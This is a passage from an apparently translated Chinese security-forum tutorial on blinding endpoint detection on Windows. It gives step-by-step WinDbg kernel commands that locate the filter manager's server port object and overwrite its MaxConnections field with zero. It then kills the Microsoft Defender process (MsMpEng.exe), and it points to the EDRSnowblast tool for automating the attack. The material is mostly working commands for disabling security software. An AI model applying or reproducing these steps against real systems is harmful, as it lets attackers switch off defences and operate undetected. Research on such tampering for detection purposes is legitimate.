
### 第8步 - 使用指针间接引用并获取第一个服务器端口对象的地址（`FLTMGR!_FLT_SERVER_PORT_OBJECT`的`FilterLink`地址）：`0xffffca0c3eaf73f0`

```
kd> ? poi(ffffca0c`386e8250)
```

### 第9步 - 计算`MaxConnections`字段的地址：`0xffffca0c3eaf7430`

```
kd> ? ffffca0c`3eaf73f0+0x040
```

### 第10步 - 使用指针间接引用并获取`MaxConnections`的值：1000

```
kd> .formats poi(ffffca0c`3eaf7430)
```

或者

```
kd> dt _FLT_SERVER_PORT_OBJECT ffffca0c`3eaf73f0
```

最后！您成功了！

![图片描述](https://bbs.kanxue.com/upload/attach/202310/876202_3YVXS9TPA3SDJ2N.webp)

### 最后的步骤 - 将`MaxConnections`的值设置为零并终止`EDR_Process.exe`进程

```
kd> eq 0xffffca0c3eaf7430 0
```

然后

```
kd> !process 0 0 MsMpEng.exe
PROCESS ffffa40a23a5f340
kd> .kill ffffa40a23a5f340
```

由于对我来说，在内核内存中可视化自己所处的位置、数据结构的字段、数据结构之间的链接、应该使用的偏移量等等，这真是一场噩梦。因此，我制作了下面的地图（还包括Windbg命令）。

![图片描述](https://bbs.kanxue.com/upload/attach/202310/876202_24CSX5WARU2QW22.webp)

也许（就像我一样），您想知道那些用于计算的值是什么：是的，那些是偏移量。

偏移量可能会在Windows更新后发生变化，个人我使用了`EDRSandblast`的`ExtractOffsets.py`脚本的自定义版本（在`EDRSnowblast`中可用）。下面显示了输出示例。

![图片描述](https://bbs.kanxue.com/upload/attach/202310/876202_YKGQNKPBR45E4EA.webp)

因为我们知道方法和偏移量，我们可以自动化这个过程！PoC或者GTFO，可以在[EDRSnowblast](<https://bbs.kanxue.com/elink@7a9K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6a6M7X3q4F1k6$3g2Q4x3X3c8o6P5h3u0W2M7X3c8W2k6X3g2F1M7$3g2Q4x3V1k6q4c8q4u0e0L8X3!0%4j5X3I4S2M7%4c8Q4x3V1k6T1L8r3!0T1i4K6u0r3z5e0V1#2x3K6t1J5z5e0p5^5x3r3b7K6j5$3x3#2y4o6p5K6x3X3p5K6y4K6c8X3y4o6u0U0y4X3b7&6y4K6M7#2z5o6u0T1k6e0W2S2j5W2)9J5c8V1g2p5f1W2y4S2L8X3c8T1L8r3q4K6N6q4)9J5c8W2g2@1K9h3I4K6i4K6u0r3c8X3I4@1L8h3N6J5e0$3k6X3M7$3g2@1M7#2)9J5k6h3y4Q4x3U0y4x3x3e0j5%4)>)中找到执行此操作的代码。

祝您愉快的黑客之旅！

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

[#基础知识](https://bbs.kanxue.com/forum-41-1-130.htm)
